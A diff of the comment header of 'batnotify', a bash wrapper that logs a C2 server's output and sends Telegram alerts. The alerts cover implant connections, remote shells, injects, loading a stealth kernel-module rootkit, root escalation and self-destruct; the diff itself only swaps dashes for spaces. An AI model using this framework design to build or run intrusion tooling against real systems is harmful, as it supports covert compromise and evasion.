@@ -1,22 +1,22 @@
 #!/usr/bin/env bash
-# batnotify — wraps bat-server stdout:
+# batnotify   wraps bat-server stdout:
 #   - tee para log em /tmp/bat-server.log
 #   - envia Telegram para eventos relevantes do C2
 #
 # Uso: tail -f /tmp/bat-console-in | bat-server 2>&1 | batnotify
 #
 # Eventos notificados (v9):
-#   [agent connected]        — novo agente ou reconexão
-#   [rawsock] session        — shell rawsock ativo (Fase 3)
-#   [result] TTP 11          — inject concluído com sucesso
-#   [result] * error         — qualquer TTP com erro
-#   [server] listening       — servidor subiu
-#   [stealth_active]         — agente carregou bat-stealth.ko autonomamente (K-series)
-#   [stealth_unloaded]       — K-99 executado; LKM descarregado
-#   [root] uid=0             — K-03 executado; escalação para root OK
-#   [root_failed]            — K-03 falhou
-#   [compile]                — KCC compilou .ko (resultado diagnóstico)
-#   self-destruct / TTP 222  — destruct executado
+#   [agent connected]          novo agente ou reconexão
+#   [rawsock] session          shell rawsock ativo (Fase 3)
+#   [result] TTP 11            inject concluído com sucesso
+#   [result] * error           qualquer TTP com erro
+#   [server] listening         servidor subiu
+#   [stealth_active]           agente carregou bat-stealth.ko autonomamente (K-series)
+#   [stealth_unloaded]         K-99 executado; LKM descarregado
+#   [root] uid=0               K-03 executado; escalação para root OK
+#   [root_failed]              K-03 falhou
+#   [compile]                  KCC compilou .ko (resultado diagnóstico)
+#   self-destruct / TTP 222    destruct executado
 
 LOG="/tmp/bat-server.log"
 
